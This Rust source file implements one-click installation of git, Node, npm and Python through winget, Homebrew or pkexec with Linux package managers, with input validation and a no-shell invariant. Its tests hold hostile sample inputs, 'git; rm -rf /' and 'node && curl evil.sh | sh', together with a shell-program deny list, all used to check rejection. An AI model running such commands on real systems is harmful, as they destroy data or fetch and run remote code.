// Copyright 2026, AgentMux Corp.
// SPDX-License-Identifier: Apache-2.0

//! `toolchain.resolve_install_command` / `toolchain.install_system_tool` —
//! one-click install of git/Node/npm/Python through the platform's own
//! package manager, streamed via the exact same `install_chunk` wire
//! shape `install.start` already uses.
//!
//! SPEC_SYSTEM_TOOLCHAIN_INSTALLER_2026_08_24.md. This is that spec's
//! Phase 1+2 (Linux + macOS + Windows) — NOT its deferred Phase 3
//! (bootstrapping a MISSING package manager itself: installing Homebrew
//! from scratch, or guiding a pre-App-Installer Windows through updating
//! it). If `brew`/`winget` aren't present, `resolve_install_step` simply
//! returns `None` and the caller falls back to the existing link+copy-
//! command UI — this module never tries to install the package manager.
//!
//! **The security-critical invariant of this whole module:** every
//! command this module can ever run comes from the fixed, hardcoded
//! catalog in `resolve_install_step` below, addressed only by a `tool_id`
//! validated against `is_safe_tool_id`. The RPC boundary never accepts a
//! package name, a raw command, or anything else that could reach a
//! `Command`'s argv from client input. Every entry is a `Vec<String>`
//! passed straight to `Command::new(program).args(args)` — never a shell
//! string through `sh -c`/`cmd /c` — so there is no interpolation surface
//! even though nothing in this table is user-suppliable today.

use std::sync::Arc;

use serde::Deserialize;
use serde_json::json;

use crate::backend::rpc::engine::WshRpcEngine;
use crate::backend::wps::{Broker, WaveEvent};
use crate::server::install_handlers::resolve_tool_path;
use crate::server::AppState;

pub const COMMAND_TOOLCHAIN_RESOLVE_INSTALL_COMMAND: &str = "toolchain.resolve_install_command";
pub const COMMAND_TOOLCHAIN_INSTALL_SYSTEM_TOOL: &str = "toolchain.install_system_tool";

/// Tool ids feed straight into the catalog match in `resolve_install_step`
/// — same shape constraint as `install_handlers::is_safe_provider_id`
/// (short, alnum + `_`/`-`), kept as its own function rather than reused
/// so this module's validation doesn't silently drift if that one's
/// constraints ever change for provider-id-specific reasons.
fn is_safe_tool_id(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 32
        && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// One resolved, ready-to-spawn install command. Never constructed from
/// client input — always the output of `resolve_install_step`'s fixed
/// catalog lookup.
#[derive(Debug, Clone)]
struct SystemInstallStep {
    program: String,
    args: Vec<String>,
    /// Informs the consent-step copy the frontend shows before running
    /// this ("This will show a Windows permission prompt" / "This will
    /// ask for your password") — never used to skip or alter execution.
    needs_elevation: bool,
    /// Binary name to re-probe after a successful package-manager exit
    /// (git/node/python's real executable — "npm" verifies via "node",
    /// same bundled-together reasoning as `claim_key_for_tool`). A
    /// package manager reporting success does NOT mean this process's
    /// own PATH can see the new binary yet: on Windows especially,
    /// winget/MSI installers update the registry-backed PATH, but a
    /// long-running process (this srv) only re-reads its environment at
    /// startup, not via the registry-change broadcast a newly-spawned
    /// process would pick up. Verifying here lets the success message
    /// tell the truth instead of silently declaring "installed" right
    /// before the caller's own immediate re-probe shows "still not
    /// found" — Codex P1, PR #2790.
    verify_bin: String,
    /// Version this exact command would install, queried live from the
    /// package manager's own catalog at resolve time — never hardcoded.
    /// A hardcoded "v24" here would repeat the exact staleness bug this
    /// repo already hit once (Taskfile.yml's VERSION var pinned to a
    /// specific `node@20` brew formula that outlived that major version
    /// — see #2942). `None` when the query itself fails or isn't
    /// implemented for this package manager (most Linux managers below);
    /// the frontend falls back to unversioned copy in that case, never a
    /// stale guess.
    resolved_version: Option<String>,
}

/// Linux package managers this module knows how to drive, in detection
/// priority order (first found on PATH wins — see `detect_linux_package_manager`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LinuxPackageManager {
    AptGet,
    Dnf,
    Yum,
    Pacman,
    Zypper,
    Apk,
}

impl LinuxPackageManager {
    const ALL_IN_PRIORITY_ORDER: [LinuxPackageManager; 6] = [
        LinuxPackageManager::AptGet,
        LinuxPackageManager::Dnf,
        LinuxPackageManager::Yum,
        LinuxPackageManager::Pacman,
        LinuxPackageManager::Zypper,
        LinuxPackageManager::Apk,
    ];

    fn binary_name(&self) -> &'static str {
        match self {
            Self::AptGet => "apt-get",
            Self::Dnf => "dnf",
            Self::Yum => "yum",
            Self::Pacman => "pacman",
            Self::Zypper => "zypper",
            Self::Apk => "apk",
        }
    }

    /// Per-manager non-interactive install flags + the package list.
    /// Each manager has genuinely different flag syntax — there is no
    /// single "install -y <pkgs>" that works across all of them (pacman
    /// uses `-S --noconfirm`, apk uses a bare `add`).
    fn install_args(&self, packages: &[&str]) -> Vec<String> {
        let mut args: Vec<String> = match self {
            Self::AptGet | Self::Dnf | Self::Yum | Self::Zypper => {
                vec!["install".to_string(), "-y".to_string()]
            }
            Self::Pacman => vec!["-S".to_string(), "--noconfirm".to_string()],
            Self::Apk => vec!["add".to_string()],
        };
        args.extend(packages.iter().map(|s| s.to_string()));
        args
    }
}

/// Probe for a Linux system package manager on PATH, in priority order —
/// first match wins (a system with both `apt-get` and an unrelated
/// manually-installed tool named e.g. `dnf` should still prefer the
/// native one). Every mainstream Linux distro ships with exactly one of
/// these as part of the base OS — unlike Homebrew/winget, there is no
/// "package manager itself might be missing" case to handle here.
async fn detect_linux_package_manager() -> Option<LinuxPackageManager> {
    for pm in LinuxPackageManager::ALL_IN_PRIORITY_ORDER {
        if resolve_tool_path(pm.binary_name()).await.is_some() {
            return Some(pm);
        }
    }
    None
}

/// Binary name to re-probe after a successful install (see
/// `SystemInstallStep::verify_bin`'s doc comment). `"npm"` verifies via
/// `"node"` (bundled together, same reasoning as `claim_key_for_tool`);
/// `"python"`'s real executable name differs by platform.
fn verify_bin_for_tool(tool_id: &str, windows: bool) -> Option<&'static str> {
    match tool_id {
        "git" => Some("git"),
        "node" | "npm" => Some("node"),
        "python" => Some(if windows { "python" } else { "python3" }),
        _ => None,
    }
}

/// Parses `winget show --id <id> -e`'s `Version:` line. Best-effort: any
/// failure (winget missing/erroring, unexpected output format) returns
/// `None` and the frontend falls back to unversioned copy — never a
/// guess. Deliberately a separate call from the actual install, not a
/// flag on it: `show` never mutates anything, so it's safe to run purely
/// for display even before the user has consented to installing.
async fn query_winget_version(winget_id: &str) -> Option<String> {
    let mut c = tokio::process::Command::new("winget");
    c.args(["show", "--id", winget_id, "-e"]);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        use agentmux_common::win32::CREATE_NO_WINDOW;
        c.creation_flags(CREATE_NO_WINDOW);
    }
    let output = c.output().await.ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout.lines().find_map(|line| {
        line.strip_prefix("Version:").map(|v| v.trim().to_string())
    })
}

// winget package identifiers — see https://github.com/microsoft/winget-pkgs.
// `node`/`npm` share one identifier: npm ships bundled with Node, so there
// is no separate winget package for it (mirrors the frontend catalog's
// existing node/npm-both-resolve-to-node modeling). Its own function (not
// inlined into `resolve_windows_step`) so `resolve_install_step` can look
// up the same id to query a version from, without a second copy of this
// match that could drift from the one that builds the actual install args.
fn windows_winget_id(tool_id: &str) -> Option<&'static str> {
    match tool_id {
        "git" => Some("Git.Git"),
        "node" | "npm" => Some("OpenJS.NodeJS.LTS"),
        "python" => Some("Python.Python.3.12"),
        _ => None,
    }
}

fn resolve_windows_step(tool_id: &str, resolved_version: Option<String>) -> Option<SystemInstallStep> {
    let winget_id = windows_winget_id(tool_id)?;
    Some(SystemInstallStep {
        program: "winget".to_string(),
        args: vec![
            "install".to_string(),
            "--id".to_string(),
            winget_id.to_string(),
            "-e".to_string(),
            "--silent".to_string(),
            "--accept-package-agreements".to_string(),
            "--accept-source-agreements".to_string(),
        ],
        // winget raises its own UAC prompt when a package's installer
        // requires elevation (Git-for-Windows's and Node's MSI both do)
        // — this process is never pre-elevated by AgentMux itself.
        // SPEC_SYSTEM_TOOLCHAIN_INSTALLER_2026_08_24.md §3.1 flags that
        // whether that prompt reliably attaches when winget is spawned
        // from a non-console GUI-launched process is an open, real-
        // hardware verification item, not yet confirmed.
        needs_elevation: true,
        verify_bin: verify_bin_for_tool(tool_id, true)?.to_string(),
        resolved_version,
    })
}

/// Parses `brew info --json=v2 <formula>`'s `versions.stable` field.
/// Best-effort, same posture as `query_winget_version`.
async fn query_brew_version(formula: &str) -> Option<String> {
    let output = tokio::process::Command::new("brew")
        .args(["info", "--json=v2", formula])
        .output()
        .await
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let parsed: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
    parsed
        .get("formulae")?
        .get(0)?
        .get("versions")?
        .get("stable")?
        .as_str()
        .map(|s| s.to_string())
}

/// Homebrew formula names — its own function for the same reason as
/// `windows_winget_id` above: shared between the install-args builder and
/// the version query, without a second copy that could drift.
fn brew_formula(tool_id: &str) -> Option<&'static str> {
    match tool_id {
        "git" => Some("git"),
        "node" | "npm" => Some("node"),
        "python" => Some("python@3.12"),
        _ => None,
    }
}

/// Only reachable when `brew` is already on PATH (checked by the caller,
/// `resolve_install_step`) — this module never bootstraps Homebrew itself.
fn resolve_brew_step(tool_id: &str, resolved_version: Option<String>) -> Option<SystemInstallStep> {
    let formula = brew_formula(tool_id)?;
    Some(SystemInstallStep {
        program: "brew".to_string(),
        args: vec!["install".to_string(), formula.to_string()],
        // Homebrew must not be run as root — this is the one platform
        // with no elevation step to build at all.
        needs_elevation: false,
        verify_bin: verify_bin_for_tool(tool_id, false)?.to_string(),
        resolved_version,
    })
}

/// Parses `apt-cache policy <pkg>`'s `Candidate:` line — the version apt
/// would actually install right now. Scoped to apt only, deliberately:
/// `dnf`/`pacman`/`zypper`/`apk` each have a genuinely different query
/// command and output format (`dnf info`, `pacman -Si`, `zypper info`,
/// `apk policy`/`apk info`), and implementing all five for a display-only
/// version label isn't worth the surface area in one pass. Returns `None`
/// for every other manager — the frontend falls back to unversioned copy,
/// which is honest, not a stale guess pretending to be real.
async fn query_apt_version(pkg: &str) -> Option<String> {
    let output = tokio::process::Command::new("apt-cache")
        .args(["policy", pkg])
        .output()
        .await
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout.lines().find_map(|line| {
        line.trim()
            .strip_prefix("Candidate:")
            .map(|v| v.trim().to_string())
            .filter(|v| v != "(none)")
    })
}

/// Primary package name to query a version for on apt specifically — the
/// actual install still uses `resolve_linux_step`'s full, PM-aware package
/// list below; this is only the one representative package worth asking
/// apt "what version would you install" about for display purposes.
fn apt_primary_package(tool_id: &str) -> Option<&'static str> {
    match tool_id {
        "git" => Some("git"),
        "node" | "npm" => Some("nodejs"),
        "python" => Some("python3"),
        _ => None,
    }
}

/// Elevated via `pkexec`, which raises the desktop's own native polkit
/// authentication dialog — AgentMux never renders a password field or
/// handles a credential itself. If no polkit agent is running (minimal
/// window managers, some server-oriented desktops), `pkexec` fails fast
/// with a clear, distinct error; the caller's existing link+copy-command
/// fallback remains available regardless.
///
/// Package-name note (flagged, not "fixed" — SPEC §3.1): the Debian/
/// Ubuntu (`apt-get`) `nodejs`/`npm` packages in the default repos are
/// frequently well behind current Node LTS. A more correct install on
/// `apt` systems specifically would go through the NodeSource setup
/// script rather than the bare distro package; that's a real, open data
/// decision for this catalog (bigger scope — a two-step fetch-then-run,
/// not a plain package install) and is deliberately NOT implemented
/// here. `dnf`/`pacman`/`zypper`/`apk`'s Node packages don't have the
/// same well-known staleness reputation.
fn resolve_linux_step(
    tool_id: &str,
    pm: LinuxPackageManager,
    resolved_version: Option<String>,
) -> Option<SystemInstallStep> {
    let packages: &[&str] = match tool_id {
        "git" => &["git"],
        "node" | "npm" => &["nodejs", "npm"],
        "python" => match pm {
            LinuxPackageManager::AptGet => &["python3", "python3-pip", "python3-venv"],
            LinuxPackageManager::Pacman => &["python", "python-pip"],
            LinuxPackageManager::Apk => &["python3", "py3-pip"],
            _ => &["python3", "python3-pip"],
        },
        _ => return None,
    };
    let mut args = vec![pm.binary_name().to_string()];
    args.extend(pm.install_args(packages));
    Some(SystemInstallStep {
        program: "pkexec".to_string(),
        args,
        needs_elevation: true,
        verify_bin: verify_bin_for_tool(tool_id, false)?.to_string(),
        resolved_version,
    })
}

/// The one entry point into the catalog — dispatches by compile-time
/// platform, then (macOS/Linux) by what's actually detected on this
/// machine. Returns `None` whenever nothing can be resolved (unknown
/// tool id, or — macOS/Linux only — no usable package manager found);
/// callers must treat `None` as "fall back to the existing link+copy-
/// command UI," never as an error.
/// Normalizes which claim slot a tool_id occupies in
/// `InstallSessionRegistry.active_system_tools`. `"npm"` shares Node's
/// slot on every platform (§3.5: they resolve to the exact same
/// winget/brew/apt-family package transaction — installing Node already
/// gets npm), so starting installs from both rows concurrently must not
/// be allowed to both pass the claim check and race two installs of the
/// same package (winget/msi lock errors, duplicate install prompts).
/// Codex P2, PR #2790.
fn claim_key_for_tool(tool_id: &str) -> &str {
    if tool_id == "npm" { "node" } else { tool_id }
}

async fn resolve_install_step(tool_id: &str) -> Option<SystemInstallStep> {
    if cfg!(windows) {
        // Symmetric with the macOS/Linux branches below: confirm the
        // package manager itself is actually present before resolving a
        // command for it. Without this, a Windows machine lacking winget
        // (rare, but real — pre-App-Installer Windows 10) would get
        // `available: true` with a command that fails to spawn instead of
        // gracefully falling back to the existing link+copy-command UI.
        // reagent P1, PR #2790.
        resolve_tool_path("winget").await?;
        let resolved_version = match windows_winget_id(tool_id) {
            Some(id) => query_winget_version(id).await,
            None => None,
        };
        resolve_windows_step(tool_id, resolved_version)
    } else if cfg!(target_os = "macos") {
        resolve_tool_path("brew").await?;
        let resolved_version = match brew_formula(tool_id) {
            Some(formula) => query_brew_version(formula).await,
            None => None,
        };
        resolve_brew_step(tool_id, resolved_version)
    } else {
        let pm = detect_linux_package_manager().await?;
        // Same class of check as the Windows/winget and macOS/brew
        // branches above: a package manager being present doesn't mean
        // `pkexec` (this module's one elevation mechanism on Linux, §3.1)
        // is too — minimal containers, some WSL distros, and server
        // images without a desktop/polkit stack routinely have apt/dnf
        // but no pkexec. Without this check, `available: true` would be
        // reported with a command that fails to spawn instead of falling
        // back to the link+copy-command UI. reagent P2, PR #2790.
        resolve_tool_path("pkexec").await?;
        let resolved_version = match (pm, apt_primary_package(tool_id)) {
            (LinuxPackageManager::AptGet, Some(pkg)) => query_apt_version(pkg).await,
            _ => None,
        };
        resolve_linux_step(tool_id, pm, resolved_version)
    }
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ToolIdReq {
    tool_id: String,
}

pub fn register_system_install_handlers(engine: &Arc<WshRpcEngine>, state: &AppState) {
    engine.register_handler(
        COMMAND_TOOLCHAIN_RESOLVE_INSTALL_COMMAND,
        Box::new(move |data, _ctx| {
            Box::pin(async move {
                let req: ToolIdReq = serde_json::from_value(data)
                    .map_err(|e| format!("toolchain.resolve_install_command: {e}"))?;
                if !is_safe_tool_id(&req.tool_id) {
                    return Err(format!(
                        "toolchain.resolve_install_command: invalid tool id {:?}",
                        req.tool_id
                    ));
                }
                match resolve_install_step(&req.tool_id).await {
                    Some(step) => Ok(Some(json!({
                        "available": true,
                        "program": step.program,
                        "args": step.args,
                        "needsElevation": step.needs_elevation,
                        "commandPreview": format!("{} {}", step.program, step.args.join(" ")),
                        "resolvedVersion": step.resolved_version,
                    }))),
                    None => Ok(Some(json!({ "available": false }))),
                }
            })
        }),
    );

    let registry = state.install_sessions.clone();
    let broker = state.broker.clone();
    engine.register_handler(
        COMMAND_TOOLCHAIN_INSTALL_SYSTEM_TOOL,
        Box::new(move |data, _ctx| {
            let registry = registry.clone();
            let broker = broker.clone();
            Box::pin(async move {
                let req: ToolIdReq = serde_json::from_value(data)
                    .map_err(|e| format!("toolchain.install_system_tool: {e}"))?;
                if !is_safe_tool_id(&req.tool_id) {
                    return Err(format!(
                        "toolchain.install_system_tool: invalid tool id {:?}",
                        req.tool_id
                    ));
                }
                let step = resolve_install_step(&req.tool_id).await.ok_or_else(|| {
                    format!(
                        "toolchain.install_system_tool: no installable command resolved for {:?} on this platform",
                        req.tool_id
                    )
                })?;
                let claim_key = claim_key_for_tool(&req.tool_id).to_string();
                if !registry.try_claim_system_tool(&claim_key) {
                    return Err(format!(
                        "toolchain.install_system_tool: {} is already being installed in another session",
                        req.tool_id
                    ));
                }
                let session_id = format!("sysinstall-{}", uuid::Uuid::new_v4());
                tracing::info!(
                    session_id = %session_id,
                    tool_id = %req.tool_id,
                    program = %step.program,
                    args = ?step.args,
                    "toolchain.install_system_tool"
                );

                let (cancel_tx, cancel_rx) = tokio::sync::oneshot::channel();
                registry.insert(session_id.clone(), cancel_tx);

                spawn_system_install_task(
                    broker,
                    registry,
                    session_id.clone(),
                    claim_key,
                    step,
                    cancel_rx,
                );

                Ok(Some(json!({ "sessionId": session_id })))
            })
        }),
    );
}

fn spawn_system_install_task(
    broker: Arc<Broker>,
    registry: Arc<crate::server::install_handlers::InstallSessionRegistry>,
    session_id: String,
    // Already normalized via `claim_key_for_tool` by the caller — "npm"
    // and "node" share this same key so a release here always matches
    // whichever key was actually claimed.
    claim_key: String,
    step: SystemInstallStep,
    mut cancel_rx: tokio::sync::oneshot::Receiver<()>,
) {
    tokio::spawn(async move {
        use std::process::Stdio;
        use tokio::io::{AsyncBufReadExt, BufReader};
        use tokio::process::Command;

        // Reuses the EXACT `install_chunk` wire shape `install.start`
        // already emits (`sessionId`/`line`/`stream`, and a terminal
        // `{op:"done", ok, error?}`) scoped `install:<sessionId>` — so
        // the frontend's existing streaming-log subscription code needs
        // no new event type to render this.
        let scope = format!("install:{}", session_id);
        let emit_line = |broker: &Broker, line: String, stream: &'static str| {
            broker.publish(WaveEvent {
                event: "install_chunk".to_string(),
                scopes: vec![scope.clone()],
                sender: String::new(),
                persist: 1024,
                data: Some(json!({ "sessionId": session_id, "line": line, "stream": stream })),
            });
        };
        let emit_done = |broker: &Broker, ok: bool, error: Option<String>| {
            broker.publish(WaveEvent {
                event: "install_chunk".to_string(),
                scopes: vec![scope.clone()],
                sender: String::new(),
                persist: 1024,
                data: Some(json!({ "sessionId": session_id, "op": "done", "ok": ok, "error": error })),
            });
        };

        emit_line(
            &broker,
            format!("$ {} {}", step.program, step.args.join(" ")),
            "stdout",
        );

        let mut cmd = Command::new(&step.program);
        cmd.args(&step.args);
        cmd.stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
        }

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                emit_done(&broker, false, Some(format!("spawn {}: {e}", step.program)));
                registry.drop_session(&session_id);
                registry.release_system_tool(&claim_key);
                return;
            }
        };

        let stdout = child.stdout.take().expect("piped");
        let stderr = child.stderr.take().expect("piped");

        let broker_out = broker.clone();
        let scope_out = scope.clone();
        let session_out = session_id.clone();
        let stdout_task = tokio::spawn(async move {
            let mut lines = BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                broker_out.publish(WaveEvent {
                    event: "install_chunk".to_string(),
                    scopes: vec![scope_out.clone()],
                    sender: String::new(),
                    persist: 1024,
                    data: Some(json!({ "sessionId": session_out, "line": line, "stream": "stdout" })),
                });
            }
        });

        let broker_err = broker.clone();
        let scope_err = scope.clone();
        let session_err = session_id.clone();
        let stderr_task = tokio::spawn(async move {
            let mut lines = BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                broker_err.publish(WaveEvent {
                    event: "install_chunk".to_string(),
                    scopes: vec![scope_err.clone()],
                    sender: String::new(),
                    persist: 1024,
                    data: Some(json!({ "sessionId": session_err, "line": line, "stream": "stderr" })),
                });
            }
        });

        tokio::select! {
            wait = child.wait() => {
                let _ = stdout_task.await;
                let _ = stderr_task.await;
                match wait {
                    Ok(s) if s.success() => {
                        // The package manager succeeding does NOT mean
                        // THIS already-running process can see the new
                        // binary yet — its own PATH was captured at
                        // startup and isn't refreshed by a Windows
                        // registry-change broadcast or a new login-shell
                        // read. Re-probe with the same mechanism the
                        // caller's post-install refresh will use, so a
                        // stale-PATH case is explained here instead of
                        // silently contradicting itself a moment later
                        // when that refresh still reports "not found".
                        // Codex P1, PR #2790.
                        if resolve_tool_path(&step.verify_bin).await.is_none() {
                            emit_line(
                                &broker,
                                format!(
                                    "Note: {} finished successfully, but AgentMux's current session doesn't see \"{}\" yet — restart AgentMux to pick up the updated PATH.",
                                    step.program, step.verify_bin
                                ),
                                "stdout",
                            );
                        }
                        emit_done(&broker, true, None);
                    }
                    Ok(s) => emit_done(&broker, false, Some(format!("{} exited {:?}", step.program, s.code()))),
                    Err(e) => emit_done(&broker, false, Some(format!("wait: {e}"))),
                }
            }
            // Reachable only if a session dies via connection drop before
            // the process starts producing output — the frontend never
            // offers a Cancel button once this task has actually spawned
            // the privileged command (SPEC §3.4: interrupting a package
            // manager mid-transaction, e.g. mid-dpkg-unpack, can leave
            // broken system state; that's a pre-existing risk of package
            // managers in general, not one this UI should make easier to
            // hit by offering a cancel button that implies it's safe).
            _ = &mut cancel_rx => {
                tracing::info!(session_id = %session_id, "toolchain.install_system_tool: cancel — killing child");
                let _ = child.kill().await;
                let _ = stdout_task.await;
                let _ = stderr_task.await;
                emit_done(&broker, false, Some("cancelled".into()));
            }
        }

        registry.drop_session(&session_id);
        registry.release_system_tool(&claim_key);
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_safe_tool_id_accepts_the_real_catalog_ids() {
        for id in ["git", "node", "npm", "python"] {
            assert!(is_safe_tool_id(id), "{id} should be accepted");
        }
    }

    #[test]
    fn is_safe_tool_id_rejects_shell_metacharacters_and_oversized_input() {
        for id in ["git; rm -rf /", "node && curl evil.sh | sh", "", &"a".repeat(33), "../etc"] {
            assert!(!is_safe_tool_id(id), "{id:?} should be rejected");
        }
    }

    #[test]
    fn resolve_windows_step_covers_the_catalog_and_rejects_unknown_ids() {
        let git = resolve_windows_step("git", None).unwrap();
        assert_eq!(git.program, "winget");
        assert!(git.args.contains(&"Git.Git".to_string()));
        assert!(git.needs_elevation);

        // node and npm resolve to the SAME winget package — npm ships
        // bundled with Node, there is no separate winget entry for it.
        let node = resolve_windows_step("node", None).unwrap();
        let npm = resolve_windows_step("npm", None).unwrap();
        assert_eq!(node.args, npm.args);
        assert!(node.args.contains(&"OpenJS.NodeJS.LTS".to_string()));

        assert!(resolve_windows_step("python", None).is_some());
        assert!(resolve_windows_step("docker", None).is_none());
        assert!(resolve_windows_step("", None).is_none());
    }

    #[test]
    fn resolve_windows_step_carries_the_resolved_version_through() {
        let git = resolve_windows_step("git", Some("2.47.1".to_string())).unwrap();
        assert_eq!(git.resolved_version.as_deref(), Some("2.47.1"));
    }

    #[test]
    fn resolve_brew_step_covers_the_catalog_and_never_needs_elevation() {
        for id in ["git", "node", "npm", "python"] {
            let step = resolve_brew_step(id, None).unwrap();
            assert_eq!(step.program, "brew");
            assert!(!step.needs_elevation, "brew must never be modeled as needing elevation");
        }
        assert!(resolve_brew_step("docker", None).is_none());
    }

    #[test]
    fn resolve_linux_step_uses_the_correct_flag_syntax_per_manager() {
        let apt = resolve_linux_step("git", LinuxPackageManager::AptGet, None).unwrap();
        assert_eq!(apt.program, "pkexec");
        assert_eq!(apt.args, vec!["apt-get", "install", "-y", "git"]);

        let pacman = resolve_linux_step("git", LinuxPackageManager::Pacman, None).unwrap();
        assert_eq!(pacman.args, vec!["pacman", "-S", "--noconfirm", "git"]);

        let apk = resolve_linux_step("node", LinuxPackageManager::Apk, None).unwrap();
        assert_eq!(apk.args, vec!["apk", "add", "nodejs", "npm"]);

        // python's package list is genuinely different per manager —
        // not just a flag-syntax difference.
        let python_pacman =
            resolve_linux_step("python", LinuxPackageManager::Pacman, None).unwrap();
        assert_eq!(python_pacman.args, vec!["pacman", "-S", "--noconfirm", "python", "python-pip"]);
        let python_apt = resolve_linux_step("python", LinuxPackageManager::AptGet, None).unwrap();
        assert_eq!(
            python_apt.args,
            vec!["apt-get", "install", "-y", "python3", "python3-pip", "python3-venv"]
        );

        assert!(resolve_linux_step("docker", LinuxPackageManager::AptGet, None).is_none());
    }

    #[test]
    fn every_populated_catalog_entry_uses_a_plain_argv_never_a_shell_string() {
        // Defense-in-depth check for the module's own stated invariant:
        // no entry anywhere in the catalog should ever route through a
        // shell interpreter — every program is the real binary, never
        // "sh"/"bash"/"cmd"/"powershell" wrapping a formatted string.
        let shells = ["sh", "bash", "cmd", "cmd.exe", "powershell", "powershell.exe"];
        for id in ["git", "node", "npm", "python"] {
            if let Some(s) = resolve_windows_step(id, None) {
                assert!(!shells.contains(&s.program.as_str()));
            }
            if let Some(s) = resolve_brew_step(id, None) {
                assert!(!shells.contains(&s.program.as_str()));
            }
            for pm in LinuxPackageManager::ALL_IN_PRIORITY_ORDER {
                if let Some(s) = resolve_linux_step(id, pm, None) {
                    assert!(!shells.contains(&s.program.as_str()));
                    assert_eq!(s.program, "pkexec");
                }
            }
        }
    }
}
